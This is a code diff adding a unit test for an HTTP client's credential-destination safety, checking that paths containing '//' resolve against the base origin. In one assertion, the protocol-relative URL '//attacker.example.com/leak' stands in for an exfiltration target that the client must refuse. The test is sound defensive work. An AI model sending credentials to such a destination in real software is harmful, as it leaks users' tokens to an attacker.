@@ -579,5 +579,23 @@ describe('credential destination safety', () => {
     await expect(client.fetch('https://')).rejects.toThrow(/invalid request URL/);
     expect(calls).toHaveLength(0);
   });
+
+  it('resolves relative paths containing // against the base URL, not as absolute', async () => {
+    const keyStore = new MemoryKeyStore();
+    const { fetch, calls } = recorder(() => json(200, { ok: true }));
+    const client = new NinshoClient({ baseUrl: ORIGIN, keyStore, fetch });
+
+    await client.fetch('/items?ref=https://shop.example/x');
+    await client.fetch('/files//nested');
+    expect(calls.map((c) => new URL(c.url).origin)).toEqual([ORIGIN, ORIGIN]);
+    expect(calls[0]?.url).toBe(`${ORIGIN}/items?ref=https://shop.example/x`);
+    expect(calls[1]?.url).toBe(`${ORIGIN}/files//nested`);
+
+    // The anchored check must still catch the real thing.
+    await expect(client.fetch('//attacker.example.com/leak')).rejects.toThrow(
+      /refusing to send credentials to untrusted origin/,
+    );
+    expect(calls).toHaveLength(2);
+  });
 });
 
